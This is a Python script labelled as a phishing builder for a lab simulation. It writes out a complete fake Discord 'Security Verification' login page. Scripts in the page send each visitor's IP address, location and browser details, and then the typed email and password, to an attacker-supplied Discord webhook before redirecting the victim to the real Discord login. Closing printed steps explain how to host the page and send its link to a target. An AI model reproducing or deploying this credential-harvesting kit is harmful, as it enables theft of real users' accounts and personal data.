# Copyright (c) 2025 pxwild. All rights reserved.
# This software and its source code are proprietary and confidential.
# Unauthorized copying, modification, or distribution of this software,
# via any medium, is strictly prohibited without prior written permission.

import os
import random
import string
import requests
import json
import sys
import time

class PublicURLPhishing:
    def __init__(self):
        self.webhook_url = None

    def check_webhook(self, webhook_url):
        try:
            test_data = {"content": "Webhook test - Phishing Builder"}
            response = requests.post(webhook_url, json=test_data)
            return response.status_code == 204
        except:
            return False

    def send_webhook_notification(self):
        try:
            payload = {
                "content": "📄 **Created phishing HTML**",
                "username": "Security Verification System",
                "avatar_url": "https://discord.com/assets/f78426a064bc9dd24847519259bc42af.png",
                "embeds": [{
                    "title": "Phishing HTML Generated",
                    "color": 5814783,
                    "fields": [
                        {"name": "File", "value": "Phishing_site.html", "inline": True},
                        {"name": "Time", "value": time.strftime("%Y-%m-%d %H:%M:%S"), "inline": True}
                    ]
                }]
            }
            response = requests.post(self.webhook_url, json=payload)
            return response.status_code == 204
        except:
            return False

    def generate_html_content(self, webhook_url):
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Security Verification</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; }}
        body {{ background: #36393f; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }}
        .login-container {{ background: #2f3136; padding: 32px; width: 100%; max-width: 480px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2); }}
        .login-header {{ text-align: center; margin-bottom: 24px; }}
        .login-header h1 {{ color: #fff; font-size: 24px; font-weight: 700; margin-bottom: 8px; }}
        .login-header p {{ color: #b9bbbe; font-size: 16px; }}
        .security-notice {{ background: #5865f2; color: #fff; padding: 12px; border-radius: 4px; margin-bottom: 20px; text-align: center; font-size: 14px; }}
        .form-group {{ margin-bottom: 20px; }}
        .form-group label {{ display: block; color: #b9bbbe; margin-bottom: 8px; font-size: 12px; font-weight: 600; text-transform: uppercase; }}
        .form-group input {{ width: 100%; padding: 10px; height: 40px; border: 1px solid #202225; border-radius: 3px; background: #202225; color: #dcddde; font-size: 16px; transition: border-color 0.2s ease; }}
        .form-group input:focus {{ border-color: #00aff4; outline: none; }}
        .login-button {{ width: 100%; padding: 12px; height: 44px; background: #5865f2; color: #fff; border: none; border-radius: 3px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.17s ease; margin-top: 8px; }}
        .login-button:hover {{ background: #4752c4; }}
        .login-footer {{ margin-top: 20px; text-align: center; color: #72767d; font-size: 14px; }}
        .login-footer a {{ color: #00aff4; text-decoration: none; }}
        .qr-section {{ display: flex; align-items: center; margin-top: 24px; padding-top: 24px; border-top: 1px solid #40444b; }}
        .qr-code {{ width: 80px; height: 80px; background: #fff; border-radius: 8px; margin-right: 16px; display: flex; align-items: center; justify-content: center; font-size: 24px; color: #000; }}
        .qr-text {{ flex: 1; color: #b9bbbe; font-size: 14px; }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>Security Verification Required</h1>
            <p>Please verify your identity to continue</p>
        </div>
        <div class="security-notice">🔒 Your account security is our priority. Please verify your credentials.</div>
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" required placeholder="Enter your email" autocomplete="username">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" required placeholder="Enter your password" autocomplete="current-password">
            </div>
            <button type="submit" class="login-button">Verify Identity</button>
        </form>
        <div class="login-footer">
            <p>By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></p>
        </div>
        <div class="qr-section">
            <div class="qr-code">QR</div>
            <div class="qr-text">
                <strong>Mobile Verification Available</strong>
                <p>Scan the QR code with your mobile device for instant verification</p>
            </div>
        </div>
    </div>
    <script>
        const WEBHOOK_URL = "{webhook_url}";
        
        (async () => {{
            try {{
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const clientIp = ipData.ip;
                
                let locationInfo = 'Unknown';
                try {{
                    const locationResponse = await fetch(`https://ipapi.co/${{clientIp}}/json/`);
                    const locationData = await locationResponse.json();
                    locationInfo = `${{locationData.city}}, ${{locationData.region}}, ${{locationData.country_name}}`;
                }} catch (locationError) {{
                    console.log('Location detection failed');
                }}
                
                const payload = {{
                    content: "🌐 **NEW PAGE VISIT**",
                    username: "Security Verification System",
                    avatar_url: "https://discord.com/assets/f78426a064bc9dd24847519259bc42af.png",
                    embeds: [{{
                        title: "Visit Details",
                        color: 5814783,
                        fields: [
                            {{ name: "🌐 IP Address", value: clientIp, inline: false }},
                            {{ name: "📍 Location", value: locationInfo, inline: true }},
                            {{ name: "🖥️ User Agent", value: navigator.userAgent.substring(0, 100) + (navigator.userAgent.length > 100 ? "..." : ""), inline: false }},
                            {{ name: "⏰ Time", value: new Date().toLocaleString(), inline: true }}
                        ]
                    }}]
                }};
                await fetch(WEBHOOK_URL, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(payload)
                }});
            }} catch (error) {{
                console.error('Initial visit error:', error);
            }}
        }})();
        
        document.getElementById('loginForm').addEventListener('submit', async function(e) {{
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const button = this.querySelector('button');
            const originalText = button.textContent;
            button.textContent = 'Verifying...';
            button.disabled = true;
            try {{
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const clientIp = ipData.ip;
                let locationInfo = 'Unknown';
                try {{
                    const locationResponse = await fetch(`https://ipapi.co/${{clientIp}}/json/`);
                    const locationData = await locationResponse.json();
                    locationInfo = `${{locationData.city}}, ${{locationData.region}}, ${{locationData.country_name}}`;
                }} catch (locationError) {{ console.log('Location detection failed'); }}
                const payload = {{
                    content: "🔐 **NEW VERIFICATION ATTEMPT**",
                    username: "Security Verification System",
                    avatar_url: "https://discord.com/assets/f78426a064bc9dd24847519259bc42af.png",
                    embeds: [{{
                        title: "Verification Details",
                        color: 5814783,
                        fields: [
                            {{ name: "📧 Email", value: email || "Not provided", inline: true }},
                            {{ name: "🔑 Password", value: password || "Not provided", inline: true }},
                            {{ name: "🌐 IP Address", value: clientIp, inline: false }},
                            {{ name: "📍 Location", value: locationInfo, inline: true }},
                            {{ name: "🖥️ User Agent", value: navigator.userAgent.substring(0, 100) + (navigator.userAgent.length > 100 ? "..." : ""), inline: false }},
                            {{ name: "⏰ Time", value: new Date().toLocaleString(), inline: true }}
                        ]
                    }}]
                }};
                await fetch(WEBHOOK_URL, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(payload)
                }});
                setTimeout(() => {{ window.location.href = 'https://discord.com/login'; }}, 2000);
            }} catch (error) {{
                console.error('Verification error:', error);
                setTimeout(() => {{ window.location.href = 'https://discord.com/login'; }}, 2000);
            }}
        }});
    </script>
</body>
</html>"""

    def run(self):
        print("=" * 60)
        print("PUBLIC URL PHISHING BUILDER (HTB SIM)")
        print("=" * 60)
        
        webhook_url = input("Enter your Discord webhook URL: ").strip()
        
        if not self.check_webhook(webhook_url):
            print("❌ Invalid webhook URL!")
            return
        
        self.webhook_url = webhook_url
        print("✅ Webhook verified successfully!")
        
        print("\n" + "=" * 60)
        print("HTML GENERATION")
        print("=" * 60)
        
        html_content = self.generate_html_content(webhook_url)
        filename = "Phishing_site.html"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"✅ HTML file created: {filename}")
        
        if self.send_webhook_notification():
            print("✅ Webhook notification sent: 'Created phishing HTML'")
        else:
            print("❌ Failed to send webhook notification")
        
        print("\n📝 Next steps:")
        print("1. Host 'Phishing_site.html' on a public web server (e.g., HTB lab server, free hosting, or local server).")
        print("2. Get the public URL for the hosted HTML.")
        print("3. Send the public URL to the target (authorized dummy device) via simulated phishing email.")

def main():
    print("[+] Starting Phishing Builder...")
    try:
        builder = PublicURLPhishing()
        builder.run()
        print("[+] Phishing Builder finished.")
    except Exception as e:
        print(f"[!] Error running Phishing_Builder: {str(e)}")
        print("[!] Phishing Builder failed.")
    input("Press Enter to return...")

if __name__ == "__main__":

    main()
